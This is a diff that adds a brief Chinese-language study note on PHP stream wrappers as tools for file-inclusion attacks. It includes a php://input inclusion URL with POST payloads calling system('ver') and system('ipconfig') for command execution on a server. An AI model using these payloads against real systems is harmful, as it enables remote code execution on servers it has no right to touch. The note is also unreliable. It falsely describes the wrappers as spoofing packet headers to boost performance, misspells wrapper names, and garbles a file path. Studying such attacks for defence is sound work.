@@ -1,0 +1,30 @@
+php伪协议是一种php在处理数据时替换数据包头部信息，来欺骗网络协议的方式来提高性能
+
+访问本地文件系统：file://
+访问http网址：http://
+访问FTP,URLS:ftp://
+访问各个输入输出流：php;//
+压缩流：zkib://
+数据： data：//
+查找匹配的文件路径模式:glob://
+php归档:phar://
+secure shell 2:ssh2://
+RAR:rar://
+音频流:ogg://
+处理交互式的流:expect://
+
+input：
+  php：//input可以访问请求的原始数据的只读流，把post请求的数据当作php代码执行；
+http://127.0.0.1/include.php?file=php://input
+<?php   phpinfo()?>
+<?php system('ver')?>服务器
+<?php system('ipconfig')?>回环地址
+
+file访问本地文件系统
+  file://用户名-system32-diver-ecc-hosts
+
+  data以传递相应格式数据来执行php代码
+data://
+
+  
+  
